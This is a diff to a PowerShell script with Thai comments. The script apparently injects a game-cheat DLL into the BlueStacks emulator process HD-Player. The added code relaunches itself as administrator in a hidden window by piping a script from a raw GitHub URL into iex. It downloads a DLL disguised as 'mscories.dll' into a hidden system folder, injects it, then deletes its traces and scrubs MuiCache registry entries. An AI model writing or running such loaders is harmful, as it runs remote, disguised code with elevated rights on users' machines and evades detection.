@@ -1,18 +1,26 @@
-# 1. วางโค้ดต้นฉบับที่จะเข้ารหัสไว้ใน Block นี้
-$rawCode = @'
+# 1. ขอสิทธิ์ Administrator
+if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"iex ((iwr 'https://raw.githubusercontent.com/getx796-Harem/cmdFreefire/main/dugduy.ps1' -UseBasicParsing).Content)`"" -Verb RunAs
+    exit
+}
+
+# 2. ตั้งค่าไฟล์และการพรางตัว
 $url = "https://github.com/potae112/Cmdfreefire/releases/download/v1.0/dllfreefire.dll"
 $fakeName = "mscories.dll"
 $workDir = "$env:LOCALAPPDATA\Microsoft\CLR_v4.0"
 $dllPath = Join-Path $workDir $fakeName
 $targetProcess = "HD-Player"
 
+# 3. เตรียมที่เก็บไฟล์ (ซ่อนโฟลเดอร์)
 if (Test-Path $workDir) { Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue }
 New-Item -ItemType Directory -Path $workDir -Force | Out-Null
 attrib +h +s $workDir
 
+# 4. ดาวน์โหลด DLL แบบเงียบ
 $ProgressPreference = 'SilentlyContinue'
 Invoke-WebRequest -Uri $url -OutFile $dllPath -UseBasicParsing -ErrorAction SilentlyContinue
 
+# 5. โค้ด C# สำหรับ Inject DLL (รันใน RAM)
 $Source = @"
 using System;
 using System.Runtime.InteropServices;
@@ -38,6 +46,7 @@ public class Injector {
 }
 "@
 
+# 6. เริ่มการ Inject เข้า BlueStacks
 if (Test-Path $dllPath) {
     $proc = Get-Process -Name $targetProcess -ErrorAction SilentlyContinue
     if (!$proc) {
@@ -52,23 +61,13 @@ if (Test-Path $dllPath) {
     }
 }
 
+# 7. ลบร่องรอย (ไม่รีสตาร์ท Explorer)
 Start-Sleep -Seconds 5
 Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue
 Clear-History -ErrorAction SilentlyContinue
 
+# ล้าง Registry MuiCache
 $muiPath = "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache"
 Get-Item -Path $muiPath -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Property | Where-Object { $_ -like "*$fakeName*" } | ForEach-Object {
     Remove-ItemProperty -Path $muiPath -Name $_ -Force -ErrorAction SilentlyContinue
 }
-'@
-
-# 2. ประมวลผลแปลงเป็น Base64
-$bytes = [System.Text.Encoding]::UTF8.GetBytes($rawCode)
-$base64Result = [Convert]::ToBase64String($bytes)
-
-# 3. คัดลอกผลลัพธ์ลง Clipboard อัตโนมัติ และแสดงบนจอด้วย
-$base64Result | Set-Clipboard
-Write-Host "--------------------------------------------------------" -ForegroundColor Cyan
-Write-Host "ระบบคัดลอกโค้ด Base64 ลง Clipboard ให้คุณแล้ว!" -ForegroundColor Green
-Write-Host "คุณสามารถเปิดไฟล์ dugduy.ps1 แล้วกด Ctrl+V วางได้เลย" -ForegroundColor Yellow
-Write-Host "--------------------------------------------------------" -ForegroundColor Cyan
